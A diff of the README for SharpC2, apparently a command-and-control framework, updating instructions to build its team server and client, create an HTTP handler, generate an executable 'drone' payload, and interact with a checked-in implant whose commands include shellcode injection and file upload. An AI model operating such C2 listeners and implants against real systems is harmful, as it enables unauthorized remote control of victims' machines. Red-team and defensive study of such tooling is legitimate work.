@@ -11,21 +11,32 @@ The solution consists of an ASP.NET Core Team Server, a .NET Framework Implant, 
 
 The quickest way to have a play with the framework is clone the repo, then build and run the Debug versions.
 
+```
+PS C:\Tools\SharpC2> dotnet build
+
+  Client -> C:\Tools\SharpC2\Client\bin\Debug\net6.0\SharpC2.dll
+  TeamServer -> C:\Tools\SharpC2\TeamServer\bin\Debug\net6.0\TeamServer.dll
+
+Build succeeded.
+    0 Warning(s)
+    0 Error(s)
+
+Time Elapsed 00:00:01.98
+```
+
 ### Start the Team Server
 
 ```
-C:\SharpC2\TeamServer> dotnet build
-C:\SharpC2\TeamServer> cd .\bin\Debug\net6.0\
-C:\SharpC2\TeamServer\bin\Debug\net6.0> dotnet TeamServer.dll -p Passw0rd!
-
-info: Microsoft.Hosting.Lifetime[0]
+PS C:\Tools\SharpC2> cd .\TeamServer\bin\Debug\net6.0\
+PS C:\Tools\SharpC2\TeamServer\bin\Debug\net6.0> dotnet TeamServer.dll -p Passw0rd!
+info: Microsoft.Hosting.Lifetime[14]
       Now listening on: https://0.0.0.0:8443
 info: Microsoft.Hosting.Lifetime[0]
       Application started. Press Ctrl+C to shut down.
 info: Microsoft.Hosting.Lifetime[0]
       Hosting environment: Production
 info: Microsoft.Hosting.Lifetime[0]
-      Content root path: C:\SharpC2\TeamServer\bin\Debug\net6.0
+      Content root path: C:\Tools\SharpC2\TeamServer\bin\Debug\net6.0
 ```
 
 **Note**:  If the server starts in `Development` mode, it will only listen for connections on the `localhost`.  To ensure it runs in `Production` mode (and therefore listen for connections on all interfaces) set the `ASPNETCORE_ENVIRONMENT` variable to `Production`.
@@ -33,9 +44,8 @@ info: Microsoft.Hosting.Lifetime[0]
 ### Start the Client
 
 ```
-C:\SharpC2\Client> dotnet build
-C:\SharpC2\Client> cd .\bin\Debug\net6.0\
-C:\SharpC2\Client\bin\Debug\net6.0> dotnet SharpC2.dll -s localhost -p 8443 -n rasta -P Passw0rd!
+PS C:\Tools\SharpC2\Client\bin\Debug\net6.0> dotnet SharpC2.dll -s localhost -p 8443 -n rasta -P Passw0rd!
+
   ___ _                   ___ ___
  / __| |_  __ _ _ _ _ __ / __|_  )
  \__ \ ' \/ _` | '_| '_ \ (__ / /
@@ -69,63 +79,71 @@ Server Certificate
 accept? [y/N] >
 ```
 
-### Configure and Start the Default HTTP Handler
+### Create & Start HTTP Handler
+
+Use the `create` command to create a new handler.  The usage is: `create <name> <type>`. Valid types are `HTTP`, `TCP` and `SMB`.
 
 ```
 [drones] > handlers
-
 [handlers] > list
 
-Name          Running
-----          -------
-default-http  False
-default-smb   False
+No Handlers
 
-[handlers] > set default-http BindPort 8080
+[handlers] > create demo-http HTTP
+[+] Handler "demo-http" created.
+```
+
+When a handler has been created, you can set its parameters with the `set` command.  The usage is: `set <handler> <parameter> <value>`.
+
+```
+[handlers] > set demo-http BindPort 8080
 [+] BindPort set to 8080
 
-[handlers] > set default-http ConnectPort 8080
-ConnectPort set to 8080
+[handlers] > set demo-http ConnectPort 8080
+[+] ConnectPort set to 8080
+```
 
-[handlers] > start default-http
-[+] Handler "default-http" started.
+Finally, run the handler with the `start` command.  The usage is: `start <handler>`.
+
+```
+[handlers] > start demo-http
+[+] Handler "demo-http" started.
 
 [handlers] > list
 
-Name          Running
-----          -------
-default-http  True
-default-smb   False
-
-[handlers] > back
-[drones] >
+Name       Running
+----       -------
+demo-http  True
 ```
 
 ### Generate a Payload for the Handler
 
-```
-[drones] > payload default-http Exe c:\payloads\drone.exe
-[+] 204800 bytes saved.
-```
-
-Execute the payload.
+Use the `payload` command to generate a payload for a handler.  The usage is: `payload <handler> <format> <path>`.  Valid formats are: `Exe`, `Dll`, `Raw` & `Svc`.
 
 ```
-[+] Drone abf7be1c27 checked in from Daniel@Ghost-Canyon.
+[drones] > payload demo-http Exe c:\payloads\http-drone.exe
+[+] 164352 bytes saved.
+```
+
+Execute the payload, and the Drone should check-in.
+
+```
+[+] Drone fea75efa53 checked in from Daniel@Ghost-Canyon.
 
 [drones] > list
 
-Guid        Parent  Address        Hostname      Username  Process  Pid   Integrity  Arch  LastSeen
-----        ------  -------        --------      --------  -------  ---   ---------  ----  --------
-abf7be1c27  -       192.168.1.229  Ghost-Canyon  Daniel    drone    1428  Medium     x64   24/11/2021 16:28:51
+Guid        Parent  Address        Hostname      Username  Process     Pid    Integrity  Arch  LastSeen
+----        ------  -------        --------      --------  -------     ---    ---------  ----  --------
+fea75efa53  -       192.168.1.229  Ghost-Canyon  Daniel    http-drone  17300  Medium     x64   18/12/2021 16:11:20
 ```
 
 ### Interacting with a Drone
 
-```
-[drones] > interact abf7be1c27
+Interact with a Drone via the `interact` command.  Usage is: `interact <guid>`.
 
-[abf7be1c27] > help
+```
+[drones] > interact fea75efa53
+[fea75efa53] > help
 
 Name              Description
 ----              -----------
@@ -154,7 +172,7 @@ shinject          Inject arbitrary shellcode into a process
 sleep             Set sleep interval and jitter
 upload            Upload a file to the current working directory of the Drone
 
-[abf7be1c27] > getuid
+[fea75efa53] > getuid
 [+] Tasked Drone to run getuid: 3989657f56.
 [+] Drone checked in. Sent 176 bytes.
 [+] Drone task 3989657f56 is running.
